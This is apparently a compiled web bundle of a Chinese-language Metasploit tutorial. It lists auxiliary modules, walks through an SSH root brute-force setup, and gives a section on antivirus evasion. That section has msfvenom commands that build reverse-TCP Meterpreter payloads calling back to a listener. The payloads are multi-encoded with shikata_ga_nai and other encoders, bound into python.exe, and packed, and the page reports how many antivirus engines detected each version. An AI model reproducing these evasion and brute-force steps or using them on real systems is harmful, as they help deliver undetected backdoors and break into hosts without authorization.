/dos/android/</p><p>/dos/http/</p><p>/dos/cisco/</p><p>/dos/dns/</p><p>/dos/smb/</p><p>/dos/windows/ftp/</p></li><li><p><strong>fuzzers</strong> /fuzzers/http/</p><p>/fuzzers/smb/</p><p>/gather/</p></li><li><p><strong>scanner</strong> /scanner/portscan/</p><p>/scanner/ftp/</p><p>/scanner/http/</p><p>/scanner/ssh/</p><p>/scanner/smb/</p><p>/scanner/vmware/</p><p>/scanner/vnc/</p><p>/scanner/telnet/</p><p>/scanner/msyql/</p><p>/scanner/ntp/</p><p>/scanner/openvas/</p><p>/scanner/sap/</p></li><li><p><strong>server</strong> /server/</p></li></ol><h4 id="通过分类查询指定模块" tabindex="-1"><a class="header-anchor" href="#通过分类查询指定模块" aria-hidden="true">#</a> 通过分类查询指定模块</h4><p>通过search查询指定模块</p><p>search type:<em>auxiliary</em> name:<em>smb</em></p><p>type： 后门跟的的模块类型 name ： 后门跟的就是要搜的模块名</p><h4 id="更多" tabindex="-1"><a class="header-anchor" href="#更多" aria-hidden="true">#</a> 更多</h4><p>1 whois查看域名或IP信息 （hu yi zi）</p>`,62),c={href:"http://www.baidu.com",target:"_blank",rel:"noopener noreferrer"},v=e('<p>whois 192.168.0.1</p><p>2 利用辅助模块查找邮箱</p><p>use auxiliary/gather/search_email_collector</p><p>3 DNS枚举，使用auxiliary模块下的DNS枚举模块：</p><p>use auxiliary/gather/enum_dns</p><p>4 ssh爆破，使用auxiliary模块下的ssh_login</p><p>use /auxiliary/scanner/ssh/ssh_login</p><p>set RHOSTS 192.168.1.92 (设定目标IP) set USERNAME root （设定ssh登陆账户） set PASS_FILE /kevin/ssh_passwd.txt （设定暴力字典） set THREADS 100 (线程设置为100) show options (查看更改后的参数)12345</p><p>run 开始爆破</p><h3 id="msf编码免杀" tabindex="-1"><a class="header-anchor" href="#msf编码免杀" aria-hidden="true">#</a> MSF编码免杀</h3><ul><li>杀毒软件如何检测出恶意代码的? 通过扫描出特征码、启发式恶意软件检测和行为。</li><li>免杀是做什么？ 对特征进行混淆，打乱代码。避免杀毒软件查杀。</li><li>免杀的基本方法有哪些？ 自编码处理 自捆绑+编码 多重编码 接口下载式 签名伪装式</li></ul><p>针对杀毒软件的基本检测方法，我们可以有以下集中方法实现免杀：</p><ol><li>改变特征码</li><li>改变行为</li><li>其他（接口下载式 签名伪装式等等）</li></ol>',13),m={href:"https://www.virscan.org/",target:"_blank",rel:"noopener noreferrer"},b=e(`<h4 id="不处理payload直接生成样本进行检测" tabindex="-1"><a class="header-anchor" href="#不处理payload直接生成样本进行检测" aria-hidden="true">#</a> 不处理payload直接生成样本进行检测</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload1.exe
<span class="token comment">#有25款软件报毒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="msf自编码处理payload生成样本进行检测" tabindex="-1"><a class="header-anchor" href="#msf自编码处理payload生成样本进行检测" aria-hidden="true">#</a> MSF自编码处理payload生成样本进行检测</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenom <span class="token parameter variable">--list</span> encoders <span class="token comment">#查看可以用来编码的模块</span>

msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload1.exe
<span class="token comment"># x86/shikata_ga_nai 该模块使用率最高</span>
<span class="token comment">#有26款软件报毒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="自捆绑处理payload生成样本进行检测" tabindex="-1"><a class="header-anchor" href="#自捆绑处理payload生成样本进行检测" aria-hidden="true">#</a> 自捆绑处理payload生成样本进行检测</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>msfvenon的-x参数可以指定一个可执行文件<span class="token punctuation">(</span>exe文件<span class="token punctuation">)</span>，将payload与其捆绑。
msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-x</span> python.exe <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload2.exe
<span class="token comment">#有7款软件报毒</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="msf自捆绑-编码处理payload生成样本进行检测" tabindex="-1"><a class="header-anchor" href="#msf自捆绑-编码处理payload生成样本进行检测" aria-hidden="true">#</a> MSF自捆绑+编码处理payload生成样本进行检测</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#编码10次有4款杀毒软件报毒</span>
msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-x</span> python.exe <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload3.exe

<span class="token comment">#编码20次有5款杀毒软件报毒</span>
msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-x</span> python.exe <span class="token parameter variable">-i</span> <span class="token number">20</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload4.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="msf多重编码-自捆绑payload生成样本进行检测" tabindex="-1"><a class="header-anchor" href="#msf多重编码-自捆绑payload生成样本进行检测" aria-hidden="true">#</a> MSF多重编码+自捆绑payload生成样本进行检测</h4><ul><li>通过管道，让msfvenom用不同编码器对攻击载荷进行多种编码。先用x86/shikata_ga_nai编码10次，接着来10次的alpha_upper编码，再来10次的countdown编码，最后才生成payload。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment">#有4款杀毒软件报毒</span>
msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows  <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span><span class="token number">192.168</span>.0.142 <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> <span class="token parameter variable">-e</span> x86/shikata_ga_nai <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> raw <span class="token operator">|</span> msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-e</span> x86/alpha_upper <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-f</span> raw <span class="token operator">|</span> msfvenom <span class="token parameter variable">-a</span> x86 <span class="token parameter variable">--platform</span> Windows <span class="token parameter variable">-e</span> x86/countdown <span class="token parameter variable">-i</span> <span class="token number">10</span> <span class="token parameter variable">-x</span> python.exe <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> payload5.exe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="生成shellcode使用c语言调用" tabindex="-1"><a class="header-anchor" href="#生成shellcode使用c语言调用" aria-hidden="true">#</a> 生成Shellcode使用C语言调用</h4><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token number">1</span>.直接在linux中利用msf的meterpreter生成的文件以.c形式文件存储，得到机器码
msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.x.x <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4456</span> <span class="token parameter variable">-f</span> c <span class="token operator">&gt;</span>c0001.c
<span class="token number">2</span>.改c文件，并编译，并加壳
<span class="token number">3</span>.随便写一个hello world
<span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
printf<span class="token punctuation">(</span><span class="token string">&quot;hello,world<span class="token entity" title="\\n">\\n</span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

然后编译 并加壳
vmp加壳工具
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,13);function u(k,h){const n=t("ExternalLinkIcon");return p(),i("div",null,[d,a("p",null,[s("whois "),a("a",c,[s("www.baidu.com"),r(n)])]),v,a("p",null,[s("查杀网站："),a("a",m,[s("https://www.virscan.org/"),r(n)])]),b])}const g=l(o,[["render",u],["__file","Metasploit工具使用.html.vue"]]);export{g as default};
